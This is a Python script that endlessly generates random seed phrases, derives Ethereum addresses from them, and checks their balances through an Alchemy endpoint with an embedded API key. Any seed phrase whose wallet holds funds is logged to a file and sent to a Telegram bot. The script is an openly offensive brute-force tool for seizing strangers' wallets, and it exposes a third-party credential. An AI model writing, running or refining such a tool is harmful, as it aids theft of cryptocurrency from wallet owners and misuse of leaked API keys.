from mnemonic import Mnemonic
from web3.auto import Web3
import requests
import simplejson
import traceback
from pprint import pprint
w3 = Web3(Web3.HTTPProvider("https://eth-mainnet.g.alchemy.com/v2/cVoH6Tl8hMagXnCBYRb3cl7wxj7TXbCu"))
checkedList=[]
def sendToTelegram(words):
	botToken=""# YOUR BOT TOKEN
	chatId=""#Your Channel
	data="from bot : "+words
	url="https://api.telegram.org/bot"+botToken+"/sendMessage"
	requests.get(url, params = {"chat_id": chatId,"text":data})

def generate():
	mnemo = Mnemonic("english")
	words = mnemo.generate(strength=128)
	return words
def check_word(word):
    if word in checkedList:
        return False
    else:
        return True
def getWallet(my_mnemonic):
	w3.eth.account.enable_unaudited_hdwallet_features()
	account = w3.eth.account.from_mnemonic(my_mnemonic, account_path="m/44'/60'/0'/0/0")
	#account_BTC = w3.eth.account.from_mnemonic(my_mnemonic, account_path="m/44'/0'/0'/0/0")
	return account
def saveToFile(words,balance,network):
	f = open('result_eth.txt', 'a')
	f.write("seed phrase: " + words + "\t" + "Bal: " + str(balance) + " "+network+".\n")
def checkBalance(words):
	account=getWallet(words)
	#https://api-eu1.tatum.io/v3/bitcoin/address/balance/
	try:
		eth=w3.eth.get_balance(account.address)
		if eth > 0 :
			saveToFile(words,eth,"ETH")
			sendToTelegram(words)
			print("GOT ONE")
	except Exception as e:
		traceback.print_exc()
if __name__ == '__main__':
	word=generate()
	i=0
	while True:
		if check_word(word):
			checkedList.append(word)
			checkBalance(word)
			i+=1
			print(f"tested number: {i}", end='\r')
		else :
			word=generate()
		
